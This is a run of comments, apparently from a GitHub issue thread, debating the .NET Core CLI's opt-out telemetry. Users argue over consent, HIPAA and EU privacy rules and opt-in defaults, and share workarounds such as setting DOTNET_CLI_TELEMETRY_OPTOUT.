For now any regular user without enough background is affected.  
Of course I agree the future can be better than nowadays :)

> I am working with CentOS folks to make that happen too (with telemetry disabled by default).

Thanks for that!

In any case I think @kstarikov has asked interesting question.
"
2121	"@benaadams I'm getting a bit tired of the parroting of MVPs. If you say something over and over and over that doesn't change the point. Seeing as we're verging on the ridiculous evasion of the problem, lets throw a ridiculous analogy at the wall:

This is like walking into a public toilet and being mugged because I didn't write a magic symbol on the wall in one of the cubicles. Look at the problems with this:

1. I'm being mugged before I get the opportunity to write the magic symbol.
2. No one, apart from perhaps in Harry Potter, wants to spent the entire day working out random things to write on the toilet wall.
3. I'm being mugged to start with when every other public toilet is safe to enter.
4. The owner of the public toilets is quite happy because he's keeping all the wallets and phones.

This is a typical example of MSFT's design policy which is fundamentally: stupid defaults and lots of static state.

I've had enough now. "
2122	"@chrisjsmith Someone (@kstarikov) asked a question, @benaadams provided an answer (AFAICT an accurate one). That's it.

Sure, if you fundamentally disagree with the whole thing, discussion about its technical details is probably irrelevant to you. But that doesn't mean others can't have that discussion or that if they do, they are somehow ""evading""."
2123	"> That's great to hear! I hope it also happens for Debian and Ubuntu and all their derivatives.

Please get involved and ask others from Debian and Ubuntu to get involved in https://github.com/dotnet/source-build/. This is where the work for building .NET Core from source for packaging is taking place.

> > RHEL already does

> Does it also disable the telemetry during installation that is independent to `DOTNET_CLI_TELEMETRY_OPTOUT`?

We dont call any dotnet commands in our installation package steps (https://git.centos.org/blob/rpms!rh-dotnet20-dotnet.git/c7-dotnet/SPECS!dotnet.spec). It just copies files around.
"
2124	I guess the issue mentioned [here](https://github.com/dotnet/cli/issues/3093#issuecomment-326327218) for the [OS X postinstall script](https://github.com/dotnet/cli/blob/cda49654dbb7f59a65232d4935fac9526847c680/packaging/osx/clisdk/scripts/postinstall) is that is runs the `internal-reportinstallsuccess` dotnet command, which sends telemetry *before* showing the user the message about `DOTNET_CLI_TELEMETRY_OPTOUT`.
2125	"FYI: Microsoft

The fact that this is an opt-out vs. opt-in and the opt-out procedure is based upon an env. var. just caused `dotnet` to fail an externally conducted HIPAA privacy/security audit at a genome testing lab in the backyard of your main campus.

Lucky for us, we were able to convert the runtime to use `Mono` and get a temporary pass, but this killed the future CIL-based projects with the lab's management...
"
2126	"@sushihangover this is exactly what I was whining about earlier. There are security policies that this will violate simply for existing.

Now you already screwed windows phone into the ground, let's not do the same with the CLR. It's not like I didn't invest 15 years of my life in the product..."
2127	"@chrisjsmith I appreciate your passion. I just read your comment on HN and wanted to say I'm equally frustrated about this decisions and others like this. Microsoft, we're talking about _command-line tooling for an application stack_. There is simply no excuse for this decision. Adopt a policy consistent with how other major vendors like Mozilla expose data collection: opt in only.

As a matter of principle, I've now updated my developer workstation configuration guidelines to require `DOTNET_CLI_TELEMETRY_OPTOUT` to be set to `1`. I've also updated my Cloud Foundry manifests to set it. In addition, I've opened a [GitHub issue](https://github.com/cloudfoundry/dotnet-core-buildpack/issues/169) that asks the Cloud Foundry devs to ensure this environment variable is set for all uses of the .NET Core buildpack."
2128	Microsoft let the train go off the rails again in open source. Their understanding of consent, dialogue, and community really needs to develop or nobody is going to want to work with them. They're going to see Microsoft as the place who can't even cope with free labor.
2129	Is there any good fork out there without this crap ? 
2130	"@richlander @terrajobst @migueldeicaza

As a followup to my last [post](https://github.com/dotnet/cli/issues/3093#issuecomment-333896396), got the word today that since the `dotnet` runtime will not allowed to be used in production, the `Xamarin.iOS` associated project is also dead as any C#/F# code sharing with the backend is now gone. 

This *was* a 25K participant (patients/researchers/doctors) Apple HealthKit/ResearchKit/CareKit `Xamarin.iOS` app (iPad Pro dashboard for researchers & doctors, iPhone and A-Watch for patients). Killed due to opt-out telemetry that should not exist in the first place, my head is still spinning...
"
2131	"> since the dotnet runtime will not allowed to be used in production,

Build (`publish` command) a [standalone/self-contained app](https://docs.microsoft.com/en-us/dotnet/core/deploying/#self-contained-deployments-scd) (which the `dotnet` cli allows you to do) with your dev or build server, then you don't even need the dotnet cli installed on you production machines and there is no telemetry to opt out of

From [Self-contained deployments (SCD)](https://docs.microsoft.com/en-us/dotnet/core/deploying/#self-contained-deployments-scd)
> **Why deploy a self-contained deployment?**
>
> Deploying a Self-contained deployment has two major advantages:
> * You have sole control of the version of .NET Core that is deployed with your app. .NET Core can be serviced only by you.
>* You can be assured that the target system can run your .NET Core app, since you're providing the version of .NET Core that it will run on.
>
> It also has a number of disadvantages:
> * Because .NET Core is included in your deployment package, you must select the target platforms for which you build deployment packages in advance.
> * The size of your deployment package is relatively large, since you have to include .NET Core as well as your app and its third-party dependencies.
> * Deploying numerous self-contained .NET Core apps to a system can consume significant amounts of disk space, since each app duplicates .NET Core files."
2132	"@benaadams Thanks for the reply, but a static `publish` does nothing for this project as the `F#` genome models are dynamically created/compiled based upon the researchers and doctors queries against the patient's records. 

They are taking TBs of graph structured data and morphing it into mobile friendly data that can be visualized ""on-the-fly"", the genetic researchers have designed/modeled this data and changing that would require a multi-year cycle of government and independent reviews/audits. Even the pre-teen patients get their private data transformed by the same dynamic models into a SpriteKit-based ""game"" with health goals that are monitored by the parents and doctors.

"
2133	"@ghost You just said what everyone else are thinking.

@chrisjsmith *thumbs up*

Why would you need to track these kind of data in the first place? Privacy is important to your customers you know!"
2134	"@sushihangover

Can you explain about Xamarin iOS?
Does it have any telemetry as well?
Or is it due to integration and code-base sharing?

"
2135	"@hardhub In terms of Xamarin, it is due to integration and code-sharing only.

Code-sharing was why a Microsoft stack was considered in the first place, each code module (and resulting assembly in this case) has a massive HIPAA, data accuracy, security, etc.. review and audit process attached to it so ""code-sharing"" between a `dotnet` backend and a Xamarin-based mobile solution would have saved about $400k on the project for the first year and another ~$200k per year after that (this post-rollout saving could vary be as much as +/-50% depending upon model/code changes). (This saving is only the review/audit saving, the saving on coding hours was about 2X as over 5000 man-hours was to be saved)

FYI: Xamarin **does** use telemetry (i.e `mono-sgen64` calls out to `api.mixpanel.com`) but this telemetry **is not within any `Xamarin.iOS` / `Xamarin.Android` runtime**."
2136	I would assume that Microsoft uses .NET Core in their own projects. This should create enough data so that it's not needed to track normal users. At least it would make sense to have opt-in instead of opt-out.
2137	"@sushihangover 
> Xamarin does use telemetry (i.e mono-sgen64 calls out to api.mixpanel.com) 

Not sure I understand all exactly... What does ""Xamarin"" mean here?
All Xamarin mobile runtimes do not have telemetry (that you said) and SGen is garbage collector that is implemented for Mono. And you have used Mono to pass audit... hmm.
"
2138	"@hardhub Sorry about the confusion (I updated my comment).

`mono-sgen64` via **Visual Studio** calls out to `api.mixpanel.com`

![screen shot 2017-10-10 at 12 36 27 am](https://user-images.githubusercontent.com/1294194/31374543-49dd9b44-ad53-11e7-88ea-78369528297a.png)
"
2139	"Can we stop the language games, the different configurations and madness and uncertainty around which bits of the CLR we are using. We’re not lawyers and don’t want to be. 

Just remove it. "
2140	"@sushihangover 

> a static `publish` does nothing for this project as the F# genome models are dynamically created/compiled based upon the researchers and doctors queries against the patient's records

Do you actually need the .Net Core CLI for that? If you directly used the F# compiler and possibly MSBuild to compile the models, then I believe there wouldn't be any telemetry."
2141	"Opt-In or complete removal.

Everything else is unacceptable."
2142	"Telemetry issue is becoming really very serious once you get with your project into any kind of protected data. Just receiving IP of machines on which CLI is running violates privacy rules as IP is regarded in most EU countries as personal data - it may allow identification of an individual. Obviously one may **turn it off after install** but since it is set to on during install by default it violates active opt in rules.

During installation information on CLI telemetry is presented to users but it is not enough according to European Union regulations. If someone wants to collect any sort of data which is not related to basic functionality of provided software it is required by law to present to user active opt in choice with default setting during user interaction being opt-out. So no action from user always means ""no telemetry allowed"". This endorses rule of **conscious user consent** made after presenting unequivocal choice with default choice being no consent from user.

Microsoft entirely unnecessary exposes itself to legal risks at least in all EU jurisdictions ... fact that nothing happened in this area so far is no guarantee that it will not happen in future. Just learn from Facebook problems ....

Please take it as a very friendly comment ... like many others in this thread I have invested years in MSFT technologies and would like to see them succeed."
2143	There is an important from the perspective of this thread issue [What is the expected usage of source-built assets?](https://github.com/dotnet/source-build/issues/187) in [dotnet/source-build repo](https://github.com/dotnet/source-build) which indicates that it will be possible to build every non MSFT distro entirely from source (no binary blobs even for tools) and it will be possible to patch **offline** builds which otherwise should be binary compatible with MSFT build. This may solve issue of telemetry in general as it can be removed from CLI code.
2144	"Maybe what MS should do is build a telemetry manager that all of their tools plug into. Then users would have a central place to opt-in or out of telemetry collection for an entire system.

The people complaining about this are probably the same people complaining about telemetry collection in every product that performs that function. If you centralize it, provide a way for people to inspect what is being sent back, and give it a big ""OFF"" switch, you could turn this whole story around. 

It would probably also be a good idea to have a telemetry manager to control and protect the server end points that are taking data. Right now every team at MS is rolling their own system for collecting the data. Someone will end up getting that wrong and there will be a data breach. Formalizing your approach to collecting data on the ""client"" and sending to back end systems for reporting will protect MS as well as other entities. 

How do you do that on Linux? That's really touchy. You could work with the distro vendors, and start an OSS project for the telemetry manager component. In the end, you are probably only going to be able to collect telemetry if you are VERY explicit about it during install on Linux systems. The overlap of privacy maximalists and Linux users is much higher than with Windows. 

It's just going to keep coming up, and the ""we told you so"" moment is coming. You only have to get it wrong once. "
2145	"Mhm I have never heard of mono-sgen64 calling mixpanel.   This must be some third party library, not the runtime.

Got some repro step that shows this?   "
2146	@b3nt0 Even if Microsoft implements a tool *they* can re-use to collect telemetry data across all products, I just don't see them building a client tool that makes it easy for the user to opt out for the simple reason that it's not in Microsoft's interest to do so. It's in their interest to make it *possible* to opt out, so the product can be used even in scenarios where telemetry is unacceptable, but it's not in their interest to make it *easy*.
2147	"I'm working on a project related this sort of thing (not .NET specific), and I wondered if the more vocal anti-telemetry posters in this thread could maybe explain to me exactly what concerns them about this type of telemetry collection.

Genuine question, and no personally identifiable data will be collected :wink: "
2148	"It's not the telemetry itself, it's:

1. the default being opt-out, not opt-in.
2. their stubbornness against making it opt-in.
3. their attempts to disguise their true motives.

I think some people are simply making a stand against data collection because it seems corporate culture is hellbent on it at all costs. There's a bigger battle being fought, and this is just one skirmish on the edge of that battle."
2149	"> Genuine question, and no personally identifiable data will be collected :wink:

Because telemetry always collects personal data, unless it calls ""home"" through some IP anonymizer service, which I doubt is the case.

Disclaimer: I don't use, nor I think I ever will, any MS SW. This thread shows just one of the reasons.

Disclaimer2: I do allow opt-in telemetry by some companies I _do_ trust, when they ask nicely for my opt-in and I think it can be indirectly helpful also for myself."
2150	"@nathan-alden-inl But there is obviously some underlying ""telemetry considered harmful"" attitude, otherwise there would be no problem with it being on by default. There are plenty of things in life that are on-by-default but can be turned off - like the Electronic Stability Control in my car. I'm interested in what people consider to be so bad about seemingly innocuous telemetry that mean it should be opt-in."
2151	@cznic Why do you have a problem with your IP address being collected? Do you have a problem with it being attached to all your posts in this thread?
2152	"> Why do you have a problem with your IP address being collected? Do you have a problem with it being attached to all your posts in this thread?

No, why I should? And if I would have a problem with it, I would hide it.

It depends on what one is doing and who collects the data. Especially the later is significant. I share much more than just an IP on Github, they also have my credit card info, for example. I consider Github trustworthy, no bad record I know of. MS? Not so much. (OK, TBH, %0 trustwothiness in my personal opinion.)"
2153	"@markrendle
it is simple. dotnet cli telemetry collects data I'm not aware of, but I'm aware of a client-server app will get my ip.
I HAVE TO provide my ip to use a client-server app, otherwise I can't use the client-server app.
However, it is TOTALLY NOT essential to provide my ip to dotnet cli.

And I don't consider telemetry harmful, I just think telemetry should respect users.
"
2154	@dotaheor What is wrong with a server getting your IP address?
2155	@markrendle it is no problem for a server to get my ip. It is just that the server should let me be aware of it gets my ip.
2156	"@cznic So for you it is important to easily determine who may and may not collect data at a ""corporate entity"" level?"
2157	@dotaheor So if the data could be sent in a way which did not reveal your IP address to the telemeter, you wouldn't mind?
2158	"> So for you it is important to easily determine who may and may not collect data at a ""corporate entity"" level?

I see where are you trying to lead me ;-)

Recent illustration: https://betanews.com/2017/10/09/cortana-skype/
"
2159	"I looked into this, it is not mono-sgen64 that is calling into MixPanel, it is Visual Studio for Mac that does.   To disable this, go into Preferences -> Other -> Feedback and click to disable the option.

"
2160	"@markrendle 
> So if the data could be sent in a way which did not reveal your IP address to the telemeter, you wouldn't mind?

You must be kidding. Here is the ""ip"" we are talking about is just an example of some private data.
"
2161	@cznic Not trying to lead you anywhere, just doing some research. Thank you for your answers, very helpful.
2162	"@markrendle
to state it again. I don't care about my private data is collected, but I must be aware of what of my private data is collected and how it is collected."
2163	@dotaheor OK, thanks, I think I get where you're coming from.
2164	"@markrendle did you miss the comments from the poster who's .net-based work in a HIPPA (US health privacy law) regulated project is now cancelled, because they can't permit tools that call home? 

""I can't think of why it might be bad"" is not a sufficient reason; it's an argument from ignorance.  Trust that it takes the tool out of consideration in high-security environments, and not for personal/moral reasons. "
2165	"@jkoberg I saw them; I'm currently working in a finance org where the proxy blocks calls to a lot of telemetry servers (and many others: e.g. I can't install VS Code extensions through the application itself) for similar reasons. I appreciate that there are environments where any leakage of any data is in violation of regulations, and that demands something other than an opt-in/opt-out preference offered to users at installation time. It's also why the SDK collects telemetry, but the runtime-only `dotnet` that is to be deployed into production environments does not; production systems obviously need to be much more locked down than developer workstations.

My interest is in the *individuals* who instinctively resent the collection of what many would consider to be harmless and potentially beneficial telemetry data from their own environments."
2166	@dotaheor Do you find [the notice](https://docs.microsoft.com/en-us/dotnet/core/tools/telemetry#disclosure) that's shown in the installer and before the first `dotnet` command is run insufficient? If so, what else can be done to make you better aware of it?
2167	"@svick 
for me, it is not a big problem, for I will set the DOTNET_CLI_TELEMETRY_OPTOUT anyway.

However, this project should state a requirement in the license to third-party tools which includes the cli that the tools must also present the notice you mentioned to users.

Besides the above point, I think the data list below which will be collected by this cli is unnecessary and unpleasant:
* Hashed MAC address: a cryptographically (SHA256) anonymous and unique ID for a machine. This metric is not published.
* Hashed current working directory.
"
2168	"The topic is trending on hacker news right now. https://news.ycombinator.com/item?id=15439001
Stupid decisions which ruin great projects... great job."
2169	"My understanding, from reading the source, of what is happening

The runtime itself does not send telemetry so you shouldn't be sending any in telemetry production regardless of the environment setting by using the runtime package and running your pre-built app with the shared runtime by doing:

`dotnet my.dll`

This is also confirmed as the [intention from the documentation](https://docs.microsoft.com/en-us/dotnet/core/tools/telemetry)

> Telemetry isn't enabled when using the dotnet command itself, with no command attached:
> * dotnet
> * dotnet [path-to-app]

Equally a `self-contained deployment` will produce an executable file that requires nothing to be installed on the target machine and will not send any telemetry when running that executable.

The sdk *does* send telemetry; this is also confirmed as the [intention from the documentation](https://docs.microsoft.com/en-us/dotnet/core/tools/telemetry)

> Telemetry is enabled when using the .NET Core CLI commands, such as:
> * dotnet build
> * dotnet pack
> * dotnet restore
> * dotnet run

The first install/run at command line  that prints the message about `DOTNET_CLI_TELEMETRY_OPTOUT` uses the `FirstTimeUseNoticeSentinel` which does ***not*** send any telemetry if it *also* is printing the message; so you are warned prior to it sending telemetry.

It does not send any telemetry after that if the `DOTNET_CLI_TELEMETRY_OPTOUT` set to one of `true`, `1`, `yes` (case insensitive)

The HIPAA example @sushihangover gave compiles programs in production so it is using the full *sdk* rather than just the *runtime*.

The workarounds to the telemetry when using the sdk (`build`/`run` etc) as I understand them are:

* either, set `DOTNET_CLI_TELEMETRY_OPTOUT` environment variable
* or, use `MsBuild` rather than `dotnet` to build your app - its what `dotnet` ends up calling and it doesn't send telemetry - its also less convenient; but what you'd probably be using on your build server

Not sure what the Windows desktop installer does first time; there is a `IsDotnetBeingInvokedFromNativeInstaller` path which does something different

**tl;dr**

If you receive the message

> Welcome to .NET Core!
> `---------------------
> Learn more about .NET Core: https://aka.ms/dotnet-docs
> Use 'dotnet --help' to see available commands or visit: https://aka.ms/dotnet-cli-docs
>
> Telemetry
> `---------
> The .NET Core tools collect usage data in order to help us improve your experience. The data is anonymous and doesn't include command-line arguments. The data is collected by Microsoft and shared with the community. You can opt-out of telemetry by setting the DOTNET_CLI_TELEMETRY_OPTOUT environment variable to '1' or 'true' using your favorite shell.
>
> Read more about .NET Core CLI Tools telemetry: https://aka.ms/dotnet-cli-telemetry

**That use will not report any telemetry**; but it will add a local sentinel file to mark that it has warned you

Running your app directly will not send any telemetry e.g.

`dotnet [path-to-app]` rather than doing `dotnet run`

This is what you should be doing, generally, in production anyway, rather than using the sdk commands"
2170	"@benaadams can you make sure that set the environment will take effect for the current opened terminal session or not?

In my honest opinion, when first time run the cli, the cli should present a [Y/n] choice to user,
instead of letting users to set an environment. If you let you set an environment, the environment
will only take effect from the next time a terminal is opened.

And the user choice should be saved in `.dotnet.conf` alike file instead.
The `.dotnet.conf` file should the same file saved the info of whether or not user has made a choice.
Later, user may delete the environment but the `.dotnet.conf` file may still record that user has made a choice."
2171	"@dotaheor 
for bash in linux for current session
`export DOTNET_CLI_TELEMETRY_OPTOUT=""1""`
and add same line to 
`~/.bashrc` 
for future sessions; or whatever's appropriate for shell you use
`~/.profile` for [terminals on Ubuntu desktop](https://help.ubuntu.com/community/EnvironmentVariables) or equivalent for your distro

Windows cmd
Current session
`set DOTNET_CLI_TELEMETRY_OPTOUT=1`
Future sessions
This PC -> Properties -> Advanced -> Environment Variables -> New User variable (Or System Variable)
Or IT admin via group policies etc

Don't know how macOS works

I assume environment variables are an easy thing to explain and get working cross platform. User home directory is more complex to explain cross platform - could always do both though"
2172	"@benaadams

for bash in linux for current session
> export DOTNET_CLI_TELEMETRY_OPTOUT=""1""
> and add same line to
> ~/.bashrc
> for future sessions; or whatever's appropriate for shell you use
> ~/.profile for terminals on Ubuntu desktop or equivalent for your distro

I know this. But this doesn't take effect for the already opened terminals.

> I assume environment variables are an easy thing to explain and get working cross platform. User home directory is more complex to explain cross platform - could always do both though

There is already a file for saving the info of whether or not user has made a choice.
So it is not a bad idea to also save user choice there.
"
2173	"@markrendle I have a question for you. MS used to have opt-in telemetry for nearly all products. But in the last years has switched to opt-out for basically everything. Why?

You should also review the whole thread for other reasons why people don't like opt-out. It's like taking pictures and video of me and my home without asking. It's like reading someone's text messages over their shoulder. It's creepy. And your promise of how the info is used today means nothing tomorrow."
2174	I don't think I'll be able to use .NET Core at work until telemetry becomes opt-in.
2175	"Thanks @benaadams for the audit.

Regards the HIPAA violation of @sushihangover: I work for a healthcare business. We have 5-7 development stacks, one of them .NET Core. This issue is mitigated very easy and would never give us any troubles.
If the customer jumps off a platform that easy he either does not understand much about software engineering, is ill advised or (worst case) has no idea about how to run a business in a regulated environment."
2176	"> If the customer jumps off a platform that easy he either does not understand much about software engineering, is ill advised or (worst case) has no idea about how to run a business in a regulated environment.

If a customer jumps on a spyware infested platform that easy she either does not understand much about software engineering, is ill advised or (worst case) has no idea about how to run a business in a regulated environment."
2177	"Let's be clear it's an obvious breach of trust, and anyone working in environments with sensitive data should avoid dotnet core arguably indefinitely. @oaiey it is better to be safe than to be sorry, i'm glad you trust microsoft with your wellbeing but I can't always read every check in to make sure they aren't sliding in telemetry that likely increases the attack surface.  

@kstarikov Same, and I'm glad I had only played with it at home. "
2178	"@markrendle  ""But there is obviously some underlying ""telemetry considered harmful"" attitude, otherwise there would be no problem with it being on by default."" 

You have a clear issue understanding consent. Forcing me to drink tea, or trying to pour it in my mouth when I'm sleeping does not mean I object to tea. It means I object to microsoft being slimy and creepy around consent and I will use other products/vendors when they do this. The difference between this and say traction control in a car is it's something I have, that you want. If you want something you have to ask for it, you don't get to just take it."
2179	"@sushihangover  On MixPanel, we looked into this, and while we used it a few years ago, we do not see traces of it on the source code, or the binaries.   We are puzzled as to where this might be coming from, and wondering if perhaps you have some third-party add-ins installed, or some external tool and perhaps those are using it?

Would love to know how you triggered this.   "
2180	"@voronoipotato 

When you go to a concert, do you have to consent to being recorded by a clearly visible camera as [a face in the crowd](https://www.shutterstock.com/image-photo/odessa-ukraine-june-25-2016-crowd-444973378)? I think the situation here is similar to that.

You can decide that this kind of recording of your actions is not okay for you and not use a product that does it. But I don't think it's as black & white as you make it sound, that it's Microsoft taking something from you without your consent."
2181	"> Hashed MAC address: a cryptographically (SHA256) anonymous and unique ID for a machine. This metric is not published.

And how much minutes is it needed to create table for MAC or IPv4 addresses (which are mostly used everywhere.. 80% of all internet users)?

>Three octet IP address used to determine geographical location†

It is enough to get subnet... and then target machine with help of MAC...

Microsoft is kidding us... :)

> When you go to a concert, do you have to consent to being recorded by a clearly visible camera as a face in the crowd?

You can compare concert and platform which will be invested in millions/billions dollars worldwide by software developers and different product vendors... hmm.

I think when you are on concert you know where you are... even when you are in the street you know where you are. And I personally do not like that.. but it happens.. look here:

https://www.youtube.com/watch?v=Doqg1eCQieo

But .net core is a tool... and even a small breach of privacy is a drawback of this tool. It is just fact.
What do you want to say by your posts? Privacy is not important? I have different opinion and big data examples confirm my thoughts very good.
"
2182	"@voronoipotato trust is a valid point. However, I trust their commercial interest a lot that they do not do bullshit. A serious HIPAA violation would be e.g. access to patient data. But we are not talking about that here.

Also regards trust: whom should I trust? The Node platform with npm and their packages with anonymous author and missing public repos? The Java platform with their installer? That leaves C++ and doing everything on my own with high costs. But that is financially not reasonable for e.g. a genome analyzer. For a insulin pump, yes.

It is not about trust. It is about being unprofessional and delivering without knowing what you deliver. In the current of state the telemetry in .NET Core SDK is well known and understood."
2183	"So, it is the case that after a year+ of this going on, that literally nothing of substantive has come from gathering this telemetry (go ahead and argue with me on that one, but I will vehemently disagree and preemptively argue that you are just adorning something useless with bells; polishing a turd, if you will). I think it is time for it to go as it is just a leveraging point against dotnet, and does nothing to accomplish the real objective: wide-spread adoption of the CLI. In fact, it can be argued that it is now inhibiting this outcome.

Maybe other CLIs do it, and maybe there is a vibe of irrationality with regards to the arguments waiving the banner of privacy (and we know Microsoft is not a big fan of privacy, if you want this opinion to change then demonstration by action is a great move), but no matter: It isn't actually accomplishing anything other than to distract people from real discussions about real possible features for the dotnet CLI. Or maybe that is the objective in itself: No such thing as bad press? That's just stupid PR if that's the case. Unless the objective is to lower your public perception so much so that no matter what step you take next there is only up; this is also a pretty distressing idea to consider.

Anyways, if developers come to you with their opinions, you should be more than eager to oblige, and you should be operating from the perspective to adopt as many users as possible. Microsoft has not needed telemetry in the past to produce good products like Visual Studio (maybe I am wrong?) and so I struggle to see why you need it now. Good experiences are not built from telemetry, they are intuited by experienced designers or developed thoughtfully and iteratively. See the Tesla models, or the iPods, or even your very own Surface Book. 

I don't generally think that telemetry is harmful, but in this instance I do believe that it is harmful to the perception of the CLI. Additionally, there are people literally telling you: ""I wanted to use this, but I could not because of the telemetry feature""; what a stupid reason to lose a customer over. There are many different avenues customers can be driven through to attract the same information that is being gathered here, normally opt-in related which is actually what you want in your telemetry anyways. Because, lets be honest: you don't actually care about the normal behavior, you want to hear about the joy points, and the pain points, and such responses are only elicited in the extrema. So long as you facilitate the reporting of bugs (does the CLI gather bug reports?), or opinion (does the CLI have opinion gathering mechanisms?) or so long as you peruse the internet/read GitHub, you are going to be OK.

Maybe now is a good time to be reminded: You do not exist without your customers.  Spend a few cycles building things that will cultivate trust and open communication. Think outside the box for a bit, the ""me too"" behaviors are disheartening. 


"
2184	Windows 10 is the Miss Piggy Edition of Windows - under all that lipstick it's still just Windows. Kind of fitting that .NET Core also is the Miss Piggy Edition of .NET's
2185	"@oaiey I think the JVM is clearly the future. You don't need the Oracle installer. It's mature, cross platform, has a wealth of mature libraries, tools and integrations and the build and deployment infrastructure is done and dusted.  You don't have to use Java if you don't want to either. It was the birth place of a lot of the design methodologies and bits of infrastructure that are crudely copied on the CLR.

I'm really wishing I took the blue pill back in 2002 and went down the Java route at this point. The red pill was a bad choice.

To be clear, a lot of people are looking at HIPAA compliance as ""for use in medical devices"". This isn't the case. PII and control of data is the problem. Telemetry is fundamentally incompatible with that as it decreases the signal-to-noise ratio.

Another analogy: You don't design a secure system with the starting point of a sieve and try and fill all the holes with environment variables. You start with something that is locked down and open what you need. The problem is that telemetry uses the same protocols and ports as the legitimate and controlled data which adds noise and risk because every communication needs to be understood. That control has to happen in every part of the environment from the workstations the developers use, through to the build infrastructure, through to the production environment. And that is why Windows 10 and this sudden increase in telemetry in developer tooling is an absolute nightmare for us."
2186	"Interesting aside: I just installed Firefox Developer Edition, from noted privacy stalwarts Mozilla.

Here's the [privacy notice](https://www.mozilla.org/en-US/privacy/firefox/) you get when you first run it:

![image](https://user-images.githubusercontent.com/178242/31435910-126b970c-ae79-11e7-82a3-bf1fe389350d.png)"
2187	"Unrelated to my project research, but another thing occurred to me.

In the UK (where I live) we are changing to an opt-out model for organ donation. The rationale is that most people think that organ donation is a positive thing and are not opposed to it, but never get around to opting-in for it. By making it opt-out, the (estimated) minority who&mdash;for whatever reason&mdash;want to hold on to their organs after they die are able to make that choice, but most people won't do that and many lives will be saved as a result.

It's something that is being done for the good of the many, but still provides an opt-out mechanism for the few who are opposed to participating."
2188	But it looks like 'few' prefer opt-out telemetry in dotnet while 'many' want it to be opt-in or nonexistent.
2189	@kstarikov Can you link me to your statistical source on that?
2190	">  Can you link me to your statistical source on that?

@markrendle - Perhaps Microsoft could gather some telemetry for you to use as a statistical source on this question. The installer and cli can have its message changed - ""those that would prefer an opt-in for telemetry in future should add an environment variable 'I-PREFER-OPTIN' but leave telemetry enabled."" Then the telemetry can call home with the value of that variable - and voilla you have a statistical source as to those users opposed :-)"
2191	@markrendle - because the only answer for unknown questions is obviously more telemetry at this point :stuck_out_tongue:
2192	"@dazinator I think they have, indirectly: the number of people using the `dotnet` SDK, minus the number of dissenters. Obviously that will not return a completely accurate number, since the subset of dissenters will probably have turned it off, so their numbers won't be included in the telemetry, but I'd hazard a guess that it would be within the margin of error anyway.

And I guess there's no way of telling how many people are actively refusing to engage with .NET Core at all because of this privacy issue, but again, margin of error."
2193	"@kspeakman 
> I have a question for you. MS used to have opt-in telemetry for nearly all products. But in the last years has switched to opt-out for basically everything. Why?

They probably read [Nudge](https://en.wikipedia.org/wiki/Nudge_(book)), by newly-minted Nobel Laureate Richard H. Thaler."
2194	"@markrendle - How do you indicate that you are a dissenter? Microsoft love environment variables for yes no questions, so I propose they stick to these now for consistency. Keep the users happy. `I_AM_A_DISSENTER` looks good to me.
"
2195	@dazinator You post in this issue or participate in HN threads.
2196	@dazinator My point being, the *vast* majority of people *just don't care*.
2197	"@markrendle - I agree to a degree. The fact that most people are simply _compliant_ though, doesn't mean you can use them as statistical weight for the support of telemetry on by default. If you did the same analysis by looking at how many people posted on the original github issue for the telemetry feature in the first place, you will find that - most people _just don't care._ about telemetry full stop. If you were biased you would say that most people don't want any kind of telemetry at all. But I am not biased! (Although my intuition is that this would be closer to the truth)

So knowing that, _most people_ don't care about telemetry at all - you can't count these people to lend weight to one side _or the other_ - they are simply compliant with whatever path is carved out for them. This leaves you with only the carers! For me, it should be alarming for microsoft that there are so many people chiming in on this issue. Personally my own concerns would be placated with a simple checkbox on the dotnet cli installer. But I am not going to give up on the platform over this issue - I am not one of the unlucky developers who are purportedly losing contracts over this!"
2198	@ghost Thanks for bringing this up. I was actually tempted to give .NET a try before I read this.
2199	"@dazinator I just think the absolute numbers for ""the carers"" are so vanishingly small compared to the overall numbers shown in the telemetry that, given the value the telemetry itself provides to the teams, it's deemed not to be an issue (pun intended).

If anybody wants to prove this wrong, and that a significant number of people really do care about this, then some sort of online petition might be the way to go."
2200	"If that is your metric for ""carers"" then _no one cares about dotnet core_. **This** is one of the most commented on Issues in all of the dotnet repos (outside of the technical issues soliciting technical feedback), _**it is the most commented issue**_. 

To say not enough people have engaged when it is clearly driving some of the most engagement is ignoring the issue because it isn't convenient. "
2201	"@h3smith To put this in perspective: 142 people have 👍 the opening comment in this issue.

The telemetry shows more than 150,000,000 data points regarding [operating system version distribution](https://blogs.msdn.microsoft.com/dotnet/2017/07/21/what-weve-learned-from-net-core-sdk-telemetry/#operating-system-version-distribution), each of which represents a separate install, if not user."
2202	Lots of people smoke. Look where that got us.
2203	"So you are conflating people bringing up an issue with **_automatically configured and enabled telemetry_** is less of an issue because of the number of metrics gathered by **_automatically configured and enabled telemetry_**?

I don't even know where to begin if that is the dismissive stance you take, because they have nothing to do with one another, other than it is on by default when installed and a user must be more than a novice to disable it *and* know that it happens. "
2204	@h3smith I'm just suggesting that when fewer than one in every million users have enough of a problem with something to complain about it, that [might not be as big a deal as a 170-comment GitHub issue participated in by a very specific type of user could make it seem](https://en.wikipedia.org/wiki/Selection_bias).
2205	Should it be tolerable if I steal something from fewer than one in every million or should I go to jail like any other thief?
2206	"@cznic False analogy. When you steal something from someone, they don't have it anymore.

Counter-analogy: if 250 Americans think a law is unjust, should the United States federal government even consider changing it?"
2207	"@markrendle Other countries here have different moral and privacy standards than America. If you want to do business there you have to meet local regulations.

This isn't good behavior over here."
2208	@chrisjsmith I think you may have taken my analogy literally. I am saying that a vanishingly-small (0.000001%) minority, however vocal, cannot reasonably expect to effect change in the face of over-whelming indifference. We live in a world where almost everything we do is quantified in some way, mostly (as in this case) a completely benign way used to improve experiences. Every time you watch a show on cable or Netflix, it's counted. Every time you visit a website or click a button, it's counted. Every time you make a call it's counted. Every kilowatt of electricity you consume is measured and recorded and aggregated against millions of other consumers' data to enable better management of the grid. And statistically speaking, *nobody cares*. If they did, Google and Facebook wouldn't be two of the biggest companies in history.
2209	"> They probably read Nudge, by newly-minted Nobel Laureate Richard H.
Thaler.

Nah, too busy counting money and watching our webcams to be bothered.

On Wed, Oct 11, 2017 at 6:55 AM, Mark Rendle <notifications@github.com>
wrote:

> @kspeakman <https://github.com/kspeakman>
>
> I have a question for you. MS used to have opt-in telemetry for nearly all
> products. But in the last years has switched to opt-out for basically
> everything. Why?
>
> They probably read Nudge <https://en.wikipedia.org/wiki/Nudge_(book)>, by
> newly-minted Nobel Laureate Richard H. Thaler.
>
> —
> You are receiving this because you were mentioned.
> Reply to this email directly, view it on GitHub
> <https://github.com/dotnet/cli/issues/3093#issuecomment-335785516>, or mute
> the thread
